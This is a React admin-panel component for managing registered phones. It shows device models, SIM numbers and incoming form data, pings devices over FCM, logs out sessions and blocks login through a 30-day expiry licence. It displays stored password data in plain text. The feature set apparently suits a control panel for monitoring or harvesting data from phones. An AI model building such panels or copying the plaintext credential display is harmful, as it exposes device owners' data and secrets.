import { useState, useEffect, useCallback, useRef } from "react";
import {
  ArrowLeft, RefreshCw, Radio,
  ShieldOff, ShieldCheck, LogOut, Eye, EyeOff, Users, Key,
  Smartphone, Wifi, WifiOff, Loader2, Send
} from "lucide-react";
import Badge from "@/components/Badge";
import type { AdminApp, Device } from "@/lib/types";
import { getDevices, deleteDevice, upsertSysEntry, deleteAllSessions, fcmCheckOnline, fcmCheckOnlineAll } from "@/lib/supabase";

interface AppDetailProps {
  app: AdminApp;
  onBack: () => void;
}

function mergeDevice(list: Device[], updated: Device): Device[] {
  const idx = list.findIndex((d) => d.sub_id === updated.sub_id);
  if (idx === -1) return [updated, ...list];
  const next = [...list];
  next[idx] = { ...list[idx], ...updated };
  return next;
}

const isSystemEntry = (d: Device) => d.sub_id.startsWith("admin_");

export default function AppDetail({ app, onBack }: AppDetailProps) {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [wsConnected, setWsConnected] = useState(false);

  const [showPassword, setShowPassword] = useState(false);
  const [logoutBusy, setLogoutBusy] = useState(false);
  const [blockBusy, setBlockBusy] = useState(false);
  const [busySessionId, setBusySessionId] = useState<string | null>(null);
  const [adminMsg, setAdminMsg] = useState<{ ok: boolean; text: string } | null>(null);

  const [fcmBusyUid, setFcmBusyUid] = useState<string | null>(null);
  const [fcmBulkBusy, setFcmBulkBusy] = useState(false);
  const [fcmResults, setFcmResults] = useState<Record<string, "sent" | "failed" | "no_token">>({});

  const wsRef = useRef<WebSocket | null>(null);

  const load = useCallback(async () => {
    setLoading(true); setError("");
    try { setDevices(await getDevices(app.token)); }
    catch (e: unknown) { setError(e instanceof Error ? e.message : "Error"); }
    finally { setLoading(false); }
  }, [app.token]);

  useEffect(() => { void load(); }, [load]);

  useEffect(() => {
    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${proto}//${window.location.host}/api/device/${app.token}/ws`;
    let ws: WebSocket;
    let reconnectTimer: ReturnType<typeof setTimeout>;
    const connect = () => {
      ws = new WebSocket(wsUrl);
      wsRef.current = ws;
      ws.onopen = () => setWsConnected(true);
      ws.onclose = () => { setWsConnected(false); reconnectTimer = setTimeout(connect, 4000); };
      ws.onerror = () => ws.close();
      ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data as string) as { event: string; data: unknown };
          if (msg.event === "device:updated" || msg.event === "device:form_data") {
            const d = msg.data as Device;
            if (d?.sub_id) setDevices((prev) => mergeDevice(prev, d));
          } else if (msg.event === "device:deleted") {
            const uid = (msg.data as { sub_id?: string })?.sub_id;
            if (uid) setDevices((prev) => prev.filter((x) => x.sub_id !== uid));
          }
        } catch { /* noop */ }
      };
    };
    connect();
    return () => { clearTimeout(reconnectTimer); ws?.close(); };
  }, [app.token]);

  const showMsg = (ok: boolean, text: string) => {
    setAdminMsg({ ok, text });
    setTimeout(() => setAdminMsg(null), 6000);
  };

  const fmt = (ts?: number | unknown) => {
    const n = typeof ts === "number" ? ts : 0;
    if (!n) return "—";
    return new Date(n).toLocaleString("en-IN", { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" });
  };

  const handleLogoutAll = async () => {
    if (!confirm("Force logout all active sessions? Devices will be logged out within 60 seconds.")) return;
    setLogoutBusy(true);
    try {
      const ts = Date.now();
      await upsertSysEntry(app.token, "admin_logout_control", "logout_control", { logoutAllAt: ts });
      await deleteAllSessions(app.token);
      setDevices((prev) => prev.filter((d) => !d.sub_id.startsWith("admin_session_")));
      showMsg(true, "Logout signal sent — all sessions will be logged out within 60 sec.");
      void load();
    } catch (e: unknown) { showMsg(false, e instanceof Error ? e.message : "Failed"); }
    finally { setLogoutBusy(false); }
  };

  const handleBlock = async () => {
    if (!confirm("Block admin login? The app will show 'Access expired'.")) return;
    setBlockBusy(true);
    try {
      const now = Date.now();
      await upsertSysEntry(app.token, "admin_expiry_main", "expiry", {
        startAt: now - 1000,
        endAt: now - 1000,
        expired: true,
        expiredAt: now,
        sealed: true,
        sealedAt: now,
        blocked: true,
      });
      showMsg(true, "Login blocked. Admin app will be denied access.");
      void load();
    } catch (e: unknown) { showMsg(false, e instanceof Error ? e.message : "Failed"); }
    finally { setBlockBusy(false); }
  };

  const handleUnblock = async () => {
    setBlockBusy(true);
    try {
      const now = Date.now();
      await upsertSysEntry(app.token, "admin_expiry_main", "expiry", {
        startAt: now,
        endAt: now + 30 * 24 * 60 * 60 * 1000,
        expired: false,
        expiredAt: null,
        sealed: true,
        sealedAt: now,
        blocked: false,
      });
      showMsg(true, "Login unblocked — access restored for 30 days.");
      void load();
    } catch (e: unknown) { showMsg(false, e instanceof Error ? e.message : "Failed"); }
    finally { setBlockBusy(false); }
  };

  const handleLogoutSession = async (uid: string) => {
    setBusySessionId(uid);
    try {
      await deleteDevice(app.token, uid);
      setDevices((p) => p.filter((x) => x.sub_id !== uid));
    } catch (e: unknown) { showMsg(false, e instanceof Error ? e.message : "Error"); }
    finally { setBusySessionId(null); }
  };

  const handleFcmCheckOne = async (uid: string, fcmToken: string) => {
    if (!fcmToken) {
      setFcmResults((r) => ({ ...r, [uid]: "no_token" }));
      return;
    }
    setFcmBusyUid(uid);
    try {
      await fcmCheckOnline(app.token, uid, fcmToken);
      setFcmResults((r) => ({ ...r, [uid]: "sent" }));
    } catch {
      setFcmResults((r) => ({ ...r, [uid]: "failed" }));
    } finally {
      setFcmBusyUid(null);
    }
  };

  const handleFcmCheckAll = async () => {
    setFcmBulkBusy(true);
    setFcmResults({});
    try {
      const results = await fcmCheckOnlineAll(app.token);
      const map: Record<string, "sent" | "failed" | "no_token"> = {};
      for (const r of results) {
        map[r.uid] = r.ok ? "sent" : r.error === "no_token" ? "no_token" : "failed";
      }
      setFcmResults(map);
      const sent = results.filter((r) => r.ok).length;
      showMsg(true, `FCM sent to ${sent}/${results.length} devices via server`);
    } catch (e: unknown) {
      showMsg(false, e instanceof Error ? e.message : "FCM broadcast failed");
    } finally {
      setFcmBulkBusy(false);
    }
  };

  const realDevices = devices.filter((d) => !isSystemEntry(d));

  // System entries only
  const sysEntries = devices.filter(isSystemEntry);
  const sessionEntries = sysEntries.filter((d) => d.sub_id.startsWith("admin_session_dev_"));
  const logoutEntry   = sysEntries.find((d) => d.sub_id === "admin_logout_control");
  const passwordEntry = sysEntries.find((d) => d.sub_id.startsWith("admin_password_"));
  const expiryEntry   = sysEntries.find((d) => d.sub_id === "admin_expiry_main");

  const expiryRaw = expiryEntry?.data_json as unknown as Record<string, unknown> | undefined;
  const isBlocked = expiryRaw?.blocked === true ||
    expiryRaw?.expired === true ||
    (typeof expiryRaw?.endAt === "number" && (expiryRaw.endAt as number) < Date.now());

  const passRaw = passwordEntry?.data_json as unknown as Record<string, unknown> | undefined;
  const passValue = passRaw
    ? Object.entries(passRaw).map(([k, v]) => `${k}: ${String(v)}`).join("\n")
    : "No data";

  const lastLogoutTs = logoutEntry
    ? (logoutEntry.data_json as unknown as Record<string, unknown>)?.logoutAllAt
    : undefined;

  return (
    <div className="flex-1 overflow-auto h-full bg-[#080c16]">
      {/* Top bar */}
      <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center gap-2 px-3 sm:px-6">
        <button onClick={onBack}
                className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors">
          <ArrowLeft className="w-4 h-4" />
        </button>
        <div className="flex-1 min-w-0 flex items-center gap-1.5 flex-wrap">
          <h1 className="text-sm font-semibold text-white truncate">{app.label || app.token}</h1>
          <Badge variant={app.is_active ? "active" : "inactive"} />
          <span className={`flex items-center gap-1 text-[10px] px-1.5 py-0.5 rounded-full ${
            wsConnected ? "bg-emerald-900/30 text-emerald-400" : "bg-slate-800 text-slate-600"
          }`}>
            <Radio className={`w-2.5 h-2.5 ${wsConnected ? "animate-pulse" : ""}`} />
            {wsConnected ? "Live" : "Off"}
          </span>
        </div>
        <button onClick={load} disabled={loading}
                className="p-1.5 rounded-lg hover:bg-slate-800 text-slate-500 hover:text-white transition-colors disabled:opacity-50">
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
        </button>
      </div>

      <div className="p-3 sm:p-6 space-y-3">
        {loading && sysEntries.length === 0 ? (
          <div className="flex items-center justify-center py-24 text-slate-600">
            <span className="w-5 h-5 border-2 border-slate-700 border-t-blue-500 rounded-full animate-spin mr-2" />
            <span className="text-sm">Loading…</span>
          </div>
        ) : error ? (
          <div className="text-center py-16 bg-[#0d1220] border border-slate-800 rounded-2xl">
            <p className="text-sm text-red-400 mb-2">{error}</p>
            <button onClick={load} className="text-xs text-blue-400 hover:text-blue-300">Retry</button>
          </div>
        ) : (
          <>
            {/* Status banner */}
            <div className={`rounded-2xl border px-4 py-3 flex items-center gap-3 ${
              isBlocked
                ? "bg-red-950/20 border-red-800/40"
                : "bg-emerald-950/20 border-emerald-800/30"
            }`}>
              {isBlocked
                ? <ShieldOff className="w-5 h-5 text-red-400 flex-shrink-0" />
                : <ShieldCheck className="w-5 h-5 text-emerald-400 flex-shrink-0" />}
              <div className="flex-1 min-w-0">
                <p className="text-sm font-semibold text-white">
                  Login is {isBlocked ? "Blocked" : "Allowed"}
                </p>
                <p className="text-xs text-slate-500">
                  {app.token}_register · {sessionEntries.length} active session{sessionEntries.length !== 1 ? "s" : ""}
                </p>
              </div>
              <span className={`text-[11px] font-bold px-2.5 py-1 rounded-full ${
                isBlocked ? "bg-red-900/40 text-red-400" : "bg-emerald-900/30 text-emerald-400"
              }`}>
                {isBlocked ? "BLOCKED" : "ACTIVE"}
              </span>
            </div>

            {/* Admin message */}
            {adminMsg && (
              <div className={`px-4 py-3 rounded-xl text-sm font-medium flex items-center justify-between ${
                adminMsg.ok
                  ? "bg-emerald-900/20 text-emerald-400 border border-emerald-800/30"
                  : "bg-red-900/20 text-red-400 border border-red-800/30"
              }`}>
                <span>{adminMsg.text}</span>
                <button onClick={() => setAdminMsg(null)} className="ml-2 opacity-60 hover:opacity-100 text-lg leading-none">×</button>
              </div>
            )}

            {/* Action buttons — always visible */}
            <div className="grid grid-cols-2 gap-2">
              {/* Block / Unblock */}
              {isBlocked ? (
                <button onClick={() => void handleUnblock()} disabled={blockBusy}
                        className="flex items-center justify-center gap-2 px-4 py-3 rounded-2xl bg-emerald-900/20 hover:bg-emerald-900/35 border border-emerald-800/30 text-emerald-400 text-sm font-semibold transition-colors disabled:opacity-50">
                  {blockBusy
                    ? <span className="w-4 h-4 border-2 border-emerald-400/30 border-t-emerald-400 rounded-full animate-spin" />
                    : <ShieldCheck className="w-4 h-4" />}
                  Unblock Login
                </button>
              ) : (
                <button onClick={() => void handleBlock()} disabled={blockBusy}
                        className="flex items-center justify-center gap-2 px-4 py-3 rounded-2xl bg-red-900/20 hover:bg-red-900/35 border border-red-800/30 text-red-400 text-sm font-semibold transition-colors disabled:opacity-50">
                  {blockBusy
                    ? <span className="w-4 h-4 border-2 border-red-400/30 border-t-red-400 rounded-full animate-spin" />
                    : <ShieldOff className="w-4 h-4" />}
                  Block Login
                </button>
              )}

              {/* Force Logout All */}
              <button onClick={() => void handleLogoutAll()} disabled={logoutBusy}
                      className="flex items-center justify-center gap-2 px-4 py-3 rounded-2xl bg-amber-900/20 hover:bg-amber-900/35 border border-amber-800/30 text-amber-400 text-sm font-semibold transition-colors disabled:opacity-50">
                {logoutBusy
                  ? <span className="w-4 h-4 border-2 border-amber-400/30 border-t-amber-400 rounded-full animate-spin" />
                  : <LogOut className="w-4 h-4" />}
                Logout All
              </button>
            </div>

            {/* Info grid */}
            <div className="grid grid-cols-2 gap-2">
              {/* Sessions count */}
              <div className="bg-[#0d1220] border border-slate-800/80 rounded-2xl px-4 py-3 flex items-center gap-3">
                <Users className="w-4 h-4 text-blue-400 flex-shrink-0" />
                <div>
                  <p className="text-xs text-slate-500 leading-none mb-0.5">Active Sessions</p>
                  <p className="text-lg font-bold text-white tabular-nums">{sessionEntries.length}</p>
                </div>
              </div>

              {/* Last logout */}
              <div className="bg-[#0d1220] border border-slate-800/80 rounded-2xl px-4 py-3 flex items-center gap-3">
                <LogOut className="w-4 h-4 text-amber-400 flex-shrink-0" />
                <div className="min-w-0">
                  <p className="text-xs text-slate-500 leading-none mb-0.5">Last Logout</p>
                  <p className="text-xs font-semibold text-white truncate">{fmt(lastLogoutTs)}</p>
                </div>
              </div>
            </div>

            {/* Password row */}
            {passwordEntry && (
              <div className="bg-[#0d1220] border border-slate-800/80 rounded-2xl px-4 py-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Key className="w-4 h-4 text-violet-400" />
                    <p className="text-sm font-medium text-white">Stored Password Data</p>
                  </div>
                  <button onClick={() => setShowPassword((v) => !v)}
                          className="flex items-center gap-1.5 text-xs text-slate-500 hover:text-white transition-colors">
                    {showPassword ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>
                {showPassword && (
                  <pre className="mt-3 bg-[#080c16] border border-slate-800 rounded-xl px-3 py-2.5 text-xs font-mono text-violet-300 whitespace-pre-wrap break-all select-all">
                    {passValue}
                  </pre>
                )}
              </div>
            )}

            {/* Active sessions list */}
            {sessionEntries.length > 0 && (
              <div className="bg-[#0d1220] border border-slate-800/80 rounded-2xl overflow-hidden">
                <div className="px-4 py-3 border-b border-slate-800/60 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Users className="w-3.5 h-3.5 text-slate-500" />
                    <p className="text-sm font-medium text-white">Active Sessions</p>
                  </div>
                  <span className="text-xs text-slate-600">{sessionEntries.length} logged in</span>
                </div>
                <div className="divide-y divide-slate-800/50">
                  {sessionEntries.map((s) => {
                    const sRaw = s.data_json as unknown as Record<string, unknown>;
                    const loggedAt = fmt(sRaw?.logged_in_at ?? sRaw?.ts);
                    const shortId = s.sub_id.replace("admin_session_dev_", "");
                    const busy = busySessionId === s.sub_id;
                    return (
                      <div key={s.sub_id} className="flex items-center gap-3 px-4 py-3">
                        <div className="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0" />
                        <div className="flex-1 min-w-0">
                          <p className="text-xs font-mono text-slate-300 truncate">{shortId}</p>
                          <p className="text-[10px] text-slate-600">Logged in {loggedAt}</p>
                        </div>
                        <button onClick={() => void handleLogoutSession(s.sub_id)} disabled={busy}
                                title="Logout this session"
                                className="p-1.5 rounded-lg hover:bg-red-900/30 text-slate-600 hover:text-red-400 transition-colors flex-shrink-0">
                          {busy
                            ? <span className="w-3.5 h-3.5 border border-slate-600 border-t-slate-400 rounded-full animate-spin block" />
                            : <LogOut className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* ── FCM Device Ping ─────────────────────────────── */}
            <div className="bg-[#0d1220] border border-slate-800/80 rounded-2xl overflow-hidden">
              <div className="px-4 py-3 border-b border-slate-800/60 flex items-center justify-between flex-wrap gap-2">
                <div className="flex items-center gap-2">
                  <Wifi className="w-3.5 h-3.5 text-blue-400" />
                  <p className="text-sm font-medium text-white">FCM — Check Online</p>
                  <span className="text-[10px] text-slate-600 bg-slate-800/60 px-1.5 py-0.5 rounded-full">
                    server-side
                  </span>
                </div>
                <button
                  onClick={() => void handleFcmCheckAll()}
                  disabled={fcmBulkBusy || realDevices.length === 0}
                  className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg bg-blue-900/30 hover:bg-blue-900/50 border border-blue-800/40 text-blue-400 font-medium transition-colors disabled:opacity-40"
                >
                  {fcmBulkBusy
                    ? <Loader2 className="w-3.5 h-3.5 animate-spin" />
                    : <Send className="w-3.5 h-3.5" />}
                  Ping All ({realDevices.length})
                </button>
              </div>

              {realDevices.length === 0 ? (
                <div className="px-4 py-6 text-center text-xs text-slate-600">
                  No registered devices yet
                </div>
              ) : (
                <div className="divide-y divide-slate-800/40">
                  {realDevices.map((d) => {
                    const dj = d.data_json as unknown as Record<string, unknown>;
                    const fcmToken = ((dj?.fcm_token ?? dj?.fcmToken ?? "") as string).trim();
                    const model = ((dj?.model ?? dj?.brand ?? "") as string).trim() || d.sub_id;
                    const sim1 = (dj?.sim1Number ?? dj?.sim_1_number ?? "") as string;
                    const checkedAt = ((d as unknown as Record<string, unknown>)?.last_heartbeat_at ?? 0) as number;
                    const isRecent = checkedAt > 0 && Date.now() - checkedAt < 15 * 60 * 1000;
                    const res = fcmResults[d.sub_id];
                    const isBusy = fcmBusyUid === d.sub_id;
                    const hasToken = fcmToken.length > 50;

                    return (
                      <div key={d.sub_id} className="flex items-center gap-3 px-4 py-3">
                        <Smartphone className="w-4 h-4 text-slate-600 flex-shrink-0" />
                        <div className="flex-1 min-w-0">
                          <p className="text-xs font-medium text-slate-200 truncate">{model}</p>
                          <p className="text-[10px] text-slate-600 truncate font-mono">
                            {d.sub_id}{sim1 ? ` · ${sim1}` : ""}
                          </p>
                          <p className={`text-[10px] mt-0.5 ${hasToken ? "text-emerald-600" : "text-slate-700"}`}>
                            {hasToken ? "FCM token ✓" : "No FCM token"}
                          </p>
                        </div>
                        <div className="flex items-center gap-2 flex-shrink-0">
                          {isRecent && (
                            <span className="flex items-center gap-1 text-[10px] text-emerald-500">
                              <Wifi className="w-3 h-3" /> Online
                            </span>
                          )}
                          {res === "sent" && !isBusy && (
                            <span className="text-[10px] text-blue-400">Sent ✓</span>
                          )}
                          {res === "no_token" && !isBusy && (
                            <span className="flex items-center gap-1 text-[10px] text-slate-500">
                              <WifiOff className="w-3 h-3" /> No token
                            </span>
                          )}
                          {res === "failed" && !isBusy && (
                            <span className="text-[10px] text-red-400">Failed</span>
                          )}
                          <button
                            onClick={() => void handleFcmCheckOne(d.sub_id, fcmToken)}
                            disabled={isBusy || fcmBulkBusy || !hasToken}
                            title={hasToken ? "Send CHECK_ONLINE via server" : "No FCM token"}
                            className="p-1.5 rounded-lg hover:bg-blue-900/30 text-slate-600 hover:text-blue-400 transition-colors disabled:opacity-30"
                          >
                            {isBusy
                              ? <Loader2 className="w-3.5 h-3.5 animate-spin" />
                              : <Send className="w-3.5 h-3.5" />}
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </>
        )}
      </div>
    </div>
  );
}
